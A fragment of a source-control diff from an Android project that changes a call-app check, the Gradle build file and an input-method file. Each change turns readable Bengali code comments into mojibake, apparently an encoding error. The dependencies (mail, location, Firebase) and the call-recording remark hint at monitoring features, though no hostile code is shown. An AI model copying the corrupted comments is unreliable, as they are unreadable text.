-            return callingApps.contains(packageName); // যদি কোনো কলিং অ্যাপ হয়, রেকর্ডিং বন্ধ হবে
+            return callingApps.contains(packageName); // à¦¯à¦¦à¦¿ à¦•à§‹à¦¨à§‹ à¦•à¦²à¦¿à¦‚ à¦…à§à¦¯à¦¾à¦ª à¦¹à§Ÿ, à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¬à¦¨à§à¦§ à¦¹à¦¬à§‡
         }
         return false;
     }
@@ -9990,12 +10056,12 @@ plugins {
 }
 
 android {
-    compileSdk 36 // সর্বোচ্চ SDK ভার্সন
+    compileSdk 36 // à¦¸à¦°à§à¦¬à§‹à¦šà§à¦š SDK à¦­à¦¾à¦°à§à¦¸à¦¨
 
     defaultConfig {
         applicationId "com.example.fasterpro11"
-        minSdk 23  // সর্বনিম্ন SDK ভার্সন
-        targetSdk 36  // নতুন API ভার্সন
+        minSdk 23  // à¦¸à¦°à§à¦¬à¦¨à¦¿à¦®à§à¦¨ SDK à¦­à¦¾à¦°à§à¦¸à¦¨
+        targetSdk 36  // à¦¨à¦¤à§à¦¨ API à¦­à¦¾à¦°à§à¦¸à¦¨
         versionCode 1
         versionName "1.0"
         multiDexEnabled true
@@ -10022,7 +10088,7 @@ android {
     }
 
     buildFeatures {
-        viewBinding true // ViewBinding ব্যবহার করা
+        viewBinding true // ViewBinding à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾
     }
     packagingOptions {
         resources {
@@ -10030,33 +10096,33 @@ android {
         }
     }
 
-    // ✅ ✅ ✅ **সমস্যা সমাধানের জন্য Packaging Options**
+    // âœ… âœ… âœ… **à¦¸à¦®à¦¸à§à¦¯à¦¾ à¦¸à¦®à¦¾à¦§à¦¾à¦¨à§‡à¦° à¦œà¦¨à§à¦¯ Packaging Options**
 }
 
 
 
 dependencies {
-    // ✅ AndroidX লাইব্রেরি - backward compatibility নিশ্চিত করার জন্য
-    implementation 'androidx.appcompat:appcompat:1.6.1' // ActionBar, Material Design কম্পোনেন্ট
-    implementation 'com.google.android.material:material:1.11.0' // Material Design ফিচার
+    // âœ… AndroidX à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ - backward compatibility à¦¨à¦¿à¦¶à§à¦šà¦¿à¦¤ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯
+    implementation 'androidx.appcompat:appcompat:1.6.1' // ActionBar, Material Design à¦•à¦®à§à¦ªà§‹à¦¨à§‡à¦¨à§à¦Ÿ
+    implementation 'com.google.android.material:material:1.11.0' // Material Design à¦«à¦¿à¦šà¦¾à¦°
     implementation 'androidx.constraintlayout:constraintlayout:2.1.4' // ConstraintLayout
-    implementation 'androidx.multidex:multidex:2.0.1' // MultiDex সাপোর্ট
+    implementation 'androidx.multidex:multidex:2.0.1' // MultiDex à¦¸à¦¾à¦ªà§‹à¦°à§à¦Ÿ
 
-    // ✅ Activity এবং Fragment জন্য Kotlin Extensions (Backward compatibility)
+    // âœ… Activity à¦à¦¬à¦‚ Fragment à¦œà¦¨à§à¦¯ Kotlin Extensions (Backward compatibility)
     implementation 'androidx.activity:activity-ktx:1.7.2'
     implementation 'androidx.fragment:fragment-ktx:1.5.7'
 
-    // ✅ Lifecycle লাইব্রেরি (ViewModel, LiveData, etc.)
+    // âœ… Lifecycle à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ (ViewModel, LiveData, etc.)
     implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.6.1'
     implementation 'androidx.lifecycle:lifecycle-viewmodel-ktx:2.6.1'
 
-    // ✅ WorkManager (ব্যাকগ্রাউন্ড টাস্ক ব্যবস্থাপনা)
+    // âœ… WorkManager (à¦¬à§à¦¯à¦¾à¦•à¦—à§à¦°à¦¾à¦‰à¦¨à§à¦¡ à¦Ÿà¦¾à¦¸à§à¦• à¦¬à§à¦¯à¦¬à¦¸à§à¦¥à¦¾à¦ªà¦¨à¦¾)
     implementation 'androidx.work:work-runtime-ktx:2.8.1'
 
-    // ✅ OkHttp লাইব্রেরি (Networking)  also for✅  php mysql DB url dependencies
+    // âœ… OkHttp à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ (Networking)  also forâœ…  php mysql DB url dependencies
     implementation 'com.squareup.okhttp3:okhttp:4.11.0'
 
-    // ✅ JavaMail API (Updated for Android 11+)
+    // âœ… JavaMail API (Updated for Android 11+)
     implementation ('com.sun.mail:android-mail:1.6.7') {
         exclude group: 'javax.activation', module: 'activation'
     }
@@ -10065,7 +10131,7 @@ dependencies {
     }
     implementation 'org.eclipse.angus:angus-activation:2.0.1'
 
-    // ✅ Firebase BOM (Bill of Materials) - আপডেটেড সংস্করণ
+    // âœ… Firebase BOM (Bill of Materials) - à¦†à¦ªà¦¡à§‡à¦Ÿà§‡à¦¡ à¦¸à¦‚à¦¸à§à¦•à¦°à¦£
     implementation platform('com.google.firebase:firebase-bom:33.8.0')
     implementation 'com.google.firebase:firebase-analytics'
     implementation 'com.google.firebase:firebase-database'
@@ -10076,13 +10142,13 @@ dependencies {
     implementation 'com.google.android.gms:play-services-location:21.2.0'
     implementation libs.ui.android
 
-    // ✅ Testing dependencies
+    // âœ… Testing dependencies
     testImplementation 'junit:junit:4.13.2'
     androidTestImplementation 'androidx.test.ext:junit:1.1.5'
     androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
 
     
-    // ✅ Google Drive API Save Data dependencies
+    // âœ… Google Drive API Save Data dependencies
    // implementation 'com.google.api-client:google-api-client-android:2.0.0'
     //implementation 'com.google.apis:google-api-services-drive:v3-rev20220713-2.0.0'
    // implementation 'com.google.android.gms:play-services-auth:20.7.0'
@@ -10362,8 +10428,6 @@ sdk.dir=C\:\\Users\\JASHORE ONLY\\AppData\\Local\\Android\\Sdk
         android:isAuxiliary="false"
         android:overridesImplicitlyEnabledSubtype="true" />
 </input-method>
-
-
 
 
 
